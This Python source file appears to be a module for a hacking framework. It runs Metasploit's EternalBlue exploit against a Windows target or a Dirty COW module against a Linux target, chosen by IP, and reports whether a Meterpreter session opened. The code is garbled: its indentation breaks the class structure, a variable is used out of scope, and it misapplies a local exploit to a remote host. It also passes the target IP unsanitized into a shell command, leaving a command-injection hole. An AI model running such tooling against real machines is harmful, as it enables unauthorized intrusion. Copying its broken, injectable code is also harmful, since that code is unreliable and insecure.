import os
import sys
import subprocess
from threading import Thread
import pyfiglet
from collections import OrderedDict

MODULE_TYPE = "exploit"
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'Cross platform Exploit',
            'Rank':'Good',
            'Platform':'Windows/Linux/Android',
            'architectures':'x86/64 bit processors',
            
            'Description': '### **Features**  - **Cross-Platform**: Exploits both Windows and Linux machines.  - **Common Vulnerabilities**: Targets well-known vulnerabilities like EternalBlue (Windows) and Dirty COW (Linux).  - **Simulated Exploits**: Uses `msfconsole` commands to simulate exploitation (replace with actual exploit code for real-world use).  - **Error Handling**: Handles connection errors and timeouts.   ',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Note':'This script is for educational purposes only',
            'Options': OrderedDict([
                ('THREADS', ('10', False, 'Number of threads for concurrent attempts')),
                ('RHOST', ('', True, 'target IP')),
                
                ('TARGET', ('', True, 'target OS (windows/linux): ')),
                
                ])
                }
    def logo(self):
    	title = 'Cross platform Exploit'
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: set RHOST <target_ip> set TARGET <windows/linux> set THREADS <no. of threads>  ,then run")
   
   
    
    
    # Exploit Functions
def exploit_windows(self,target_ip):
    try:
        # Example: Exploit EternalBlue (MS17-010)
        print(f"[*] Attempting to exploit Windows target ({target_ip}) using EternalBlue...")
        # Simulate exploit (replace with actual exploit code)
        result = subprocess.run(f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target_ip}; run'", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if "Meterpreter session" in result.stdout.decode():
            print(f"[+] Exploit successful! Session opened on {target_ip}.")
        else:
            print(f"[-] Exploit failed: {result.stderr.decode()}")
    except Exception as e:
        print(f"[-] Error: {e}")
        
    def exploit_linux(self,target_ip):
      try:
        # Example: Exploit Dirty COW (CVE-2016-5195)
        print(f"[*] Attempting to exploit Linux target ({target_ip}) using Dirty COW...")
        # Simulate exploit (replace with actual exploit code)
        result = subprocess.run(f"msfconsole -q -x 'use exploit/linux/local/dirty_cow; set RHOSTS {target_ip}; run'", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if "Meterpreter session" in result.stdout.decode():
            print(f"[+] Exploit successful! Session opened on {target_ip}.")
        else:
            print(f"[-] Exploit failed: {result.stderr.decode()}")
      except Exception as e:
        print(f"[-] Error: {e}")
        
    def execute(self):
        
        TARGET_IP = self.info['Options']['RHOST'][0]
        TARGET_OS = self.info['Options']['TARGET'][0].lower()
        THREADS = self.info['Options']['THREADS'][0]
        
        if TARGET_OS not in ["windows", "linux"]:
           print("[!] Invalid OS. Choose 'windows' or 'linux'.")
           return #sys.exit(1)
    
    if TARGET_OS == "windows":
        exploit_windows(TARGET_IP)
    elif TARGET_OS == "linux":
        exploit_linux(TARGET_IP)
      
        return f"[+] Exploiting {TARGET_OS} and Getting things ready ..."
    